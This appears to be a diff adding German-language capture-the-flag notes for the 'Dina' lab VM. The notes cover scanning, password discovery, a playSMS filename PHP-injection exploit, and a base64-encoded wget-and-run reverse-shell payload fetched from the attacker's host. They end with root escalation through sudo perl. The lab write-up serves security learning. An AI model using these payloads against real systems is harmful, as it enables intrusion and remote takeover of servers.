@@ -1,0 +1,96 @@
+Portscan: nmap -v 192.168.56.101
+		open ports: 80/tcp (http)
+
+Website: Submit Query ruft 192.168.56.101/angel/ auf, leeres Directory. mwthod=POST Schreibfehler statt method
+	nikto -host 192.168.56.101 -port 80
+		robots.txt
+			User-agent: *
+			Disallow: /ange1    ->  leer
+			Disallow: /angel1   ->  leer
+			Disallow: /nothing
+			Disallow: /tmp  ->  leer
+			Disallow: /uploads  ->  leer
+
+		/nothing
+			<!-- #my secret pass
+			freedom
+			password
+			helloworld!
+			diana
+			iloveroot -->
+
+		/secure/ directory indexing found
+			backup.zip -> backup-cred.mp3   ..keine mp3 Datei, auf Windows geprüft
+			passwortgeschützt, mit freedom geöffnet
+			uname: touhid password: *****
+			url: /SecreTSMSgatwayLogin
+
+
+playSMS:	login mit username: touhid und password: diana
+		Send from file exploit vom Ersteller der VM https://www.exploit-db.com/raw/42003/
+		Filename als Injection von php Code
+		/ nicht im Dateinamen erlaubt, Trick mit base64 Codierung
+		Filename: <?php $cmd = base64_decode('________'); $output = shell_exec($cmd); echo "$output";?>.php
+		Befehl base64 encoden, dann bei ____ einfügen
+
+METASPLOIT:
+	Reverse TCP Handler um auf die Reverse Shell zu reagieren
+		Metasploit nicht auf dem Image, nc?
+		nc -l -p 1337
+
+	Payload erstellen
+		/usr/bin/msfpc  Metasploit Framework Payload Creator
+		<type> <ip> <port> <bind/reverse>
+		/usr/bin/msfpc elf 192.168.56.102 1337 reverse -> cp blabla.elf /var/www/html/shell.elf
+		
+Befehle auf Dina:
+
+	service apache2 start  ->  Webserver zum Hochladen der Shell starten!!	
+	
+	wget -O /tmp/shell.elf "192.168.56.102/shell.elf"
+	base64: d2dldCAtTyAvdG1wL3NoZWxsLmVsZiAiaHR0cDovLzE5Mi4xNjguNTYuMTAyL3NoZWxsLmVsZiIg
+
+	chmod 777 /tmp/shell.elf  (vielleicht nicht möglich oder nicht nötig)
+	base64: Y2htb2QgNzc3IC90bXAvc2hlbGwuZWxm
+
+	/tmp/shell.elf
+	base64: L3RtcC9zaGVsbC5lbGY=
+
+	Eine Zeile:
+	d2dldCAtTyAvdG1wL3NoZWxsLmVsZiAiaHR0cDovLzE5Mi4xNjguNTYuMTAyL3NoZWxsLmVsZiI7IGNobW9kIDc3NyAvdG1wL3NoZWxsLmVsZjsgL3RtcC9zaGVsbC5lbGYg
+
+	Ohne chmod:
+	d2dldCAtTyAvdG1wL3NoZWxsLmVsZiAiaHR0cDovLzE5Mi4xNjguNTYuMTAyL3NoZWxsLmVsZiI7IC90bXAvc2hlbGwuZWxmIA==
+
+	msfconsole -q -r '/home/hacker/linux-shell-staged-reverse-tcp-1337-elf.rc'  -> öffnet Handler
+
+	Filename: <?php $cmd = base64_decode('d2dldCAtTyAvdG1wL3NoZWxsLmVsZiAiaHR0cDovLzE5Mi4xNjguNTYuMTAyL3NoZWxsLmVsZiI7IGNobW9kIDc3NyAvdG1wL3NoZWxsLmVsZjsgL3RtcC9zaGVsbC5lbGYg'); shell_exec($cmd);?>
+
+	kurzzeitig sogar offene shell, sudo -l zeigt, dass www-data perl benutzen darf als Superuser
+SHELL:
+	sudo perl -e "exec '/bin/sh'"
+	whoami
+	root
+	cat /root/flag.txt
+	________                                                _________
+	\________\--------___       ___         ____----------/_________/
+	    \_______\----\\\\\\   //_ _ \\    //////-------/________/
+	        \______\----\\|| (( ~|~ )))  ||//------/________/
+	            \_____\---\\ ((\ = / ))) //----/_____/
+	                 \____\--\_)))  \ _)))---/____/
+	                       \__/  (((     (((_/
+	                          |  -)))  -  ))
+	
+	
+	root password is : hello@3210
+	easy one .....but hard to guess.....
+	but i think u dont need root password......
+	u already have root shelll....
+	
+
+	CONGO.........
+	FLAG : 22d06624cd604a0626eb5a2992a6f2e6
+
+
+
+
